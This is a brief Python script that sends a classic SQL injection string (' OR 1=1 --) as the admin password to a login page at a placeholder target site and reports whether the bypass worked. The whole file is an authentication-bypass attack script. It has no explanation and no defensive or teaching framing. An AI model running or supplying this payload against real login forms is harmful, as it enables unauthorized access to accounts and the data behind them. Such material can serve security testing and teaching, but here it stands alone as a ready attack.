import requests

url = "https://target_website.com/login.php"
user = "admin"
password = "' OR 1=1 --"

response = requests.post(url, data={"user": user, "password": password})
if "Login successful" in response.text:
    print("SQL injection successful")
